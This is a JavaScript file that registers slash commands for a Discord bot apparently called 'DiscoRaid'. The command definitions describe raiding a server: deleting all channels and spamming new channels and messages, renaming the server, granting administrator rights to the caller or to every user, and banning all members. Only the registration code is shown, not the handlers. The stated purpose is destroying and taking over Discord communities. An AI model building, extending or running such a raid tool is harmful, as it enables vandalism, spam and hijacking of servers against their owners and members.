const { REST, Routes, ApplicationCommandOptionType, ApplicationCommandPermissionType } = require('discord.js');
require('dotenv').config({path:'../.env'})

const commands = [
    {
        name: 'online',
        description: 'Checks if DiscoRaid is active.',
    },
    {
      name: 'raid',
      description: "deletes all channels and spams channels/messages. PERMISSION_REQUIRED: {MANAGE CHANNELS}",
      options : [
        {
        name: "raid-message",
        description: 'messages that should be spammed during raid, you can add more than 1, seperated by a |',
        type: ApplicationCommandOptionType.String,
      },
      {
        name: 'channel-amount',
        description: 'The amount of channels that should be created.',
        type: ApplicationCommandOptionType.Integer

      },
      {
        name: 'channel-names',
        description: "the name of the channels made, you can add more than 1, seperated by a | ",
        type: ApplicationCommandOptionType.String
      },
      
      {
        name: 'message-amt-per-channel',
        description: "Amount of messages sent per channel.",
        type: ApplicationCommandOptionType.Integer
      }
    ]
    
    }, 
    
    {
      name: 'server-name',
      description: "change the server name. PERMISSION_REQUIRED: {MANAGE SERVER} ",
      options: [{
        name: 'server_name',
        description: 'what the server name should be changed to.',
        type: ApplicationCommandOptionType.String
      }
      ]
    } , 
    {
      name: 'admin-self',
      description: "Give the user ADMIN permissions. PERMISSION_REQUIRED: {ADMINISTRATOR}",
      options: [{
        name: 'role-name',
        description: 'what should the role name be.',
        type: ApplicationCommandOptionType.String
      }]

    }, {
      name: 'admin-all',
      description: "Give ALL users ADMIN permissions. PERMISSION_REQUIRED: {ADMINISTRATOR}",
      options: [{
        name: 'role-name',
        description: 'what should the role name be.',
        type: ApplicationCommandOptionType.String
      }]
    },
    {
      name: 'ban-all',
      description: 'bans everyone in a server (except admins). PERMISSION_REQUIRED: {BAN MEMBERS}'
    }
 
];



const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('Registering slash commands...');

    await rest.put(
      Routes.applicationCommands(
        process.env.CLIENT_ID,
        process.env.GUILD_ID
      ),
      { body: commands }
    );

    console.log('Slash commands were registered successfully!');
  } catch (error) {
    console.log(`There was an error: ${error}`);
  }
})();